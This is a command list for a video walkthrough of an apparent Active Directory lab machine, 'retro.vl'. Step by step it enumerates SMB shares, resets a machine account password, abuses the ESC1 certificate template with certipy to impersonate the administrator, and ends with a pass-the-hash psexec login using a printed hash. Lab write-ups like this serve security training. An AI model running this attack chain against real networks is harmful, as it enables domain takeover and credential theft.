# These commands were used in this walkthrough: https://youtu.be/OFdzT1le_zw

sudo nmap -sC -sV -Pn -p- t1

sudo nxc smb t1 -u 'anonymous' -p '' --shares

smbclient \\dc.retro.vl\Trainees -U 'anonymous%'

get Important.txt 

nxc smb dc.retro.vl -u trainee -p trainee --shares

smbclient -L \\[ip]\Notes -U trainee%trainee

get user.txt
get ToDo.txt

sudo nxc smb DC.retro.vl -u 'guest' -p '' --rid-brute

sudo nxc smb DC.retro.vl -u 'BANKING$' -p 'banking' # Trust error

changepasswd.py -newpass test123 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr

##I try, but not helpful: secretsdump.py retro.vl/banking\$:'test123'@dc.retro.vl##

certipy find -u 'BANKING$@retro.vl' -p test123 -vulnerable -stdout #we see esc1

##
Hint: if u run into certipy error and couldn't install probabaly, check my script below:
https://github.com/strikoder/kalipen/blob/main/installation_scripts/AD_tools.sh
##

#doesn't work
certipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl #doesn't work

certipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096 #3072

## certipy to auth as administrator:
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44 # didn't work, sid provided in cert probably for the banking not the administrator

####lets try to search for sid####

#method 1: rpcclient

rpcclient -U 'BANKING$%test123' dc.retro.vl
enumdomusers
lookupnames Administrator

#method2:  lookupsid (Impacket)
lookupsid.py retro.vl/BANKING$:test123@dc.retro.vl

certipy req -u 'BANKING$@retro.vl' -p test123 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid  S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096

certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44

#we use the hash from above to login, u can use evil-rm or old cme to auth as well
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389 administrator@DC.retro.vl
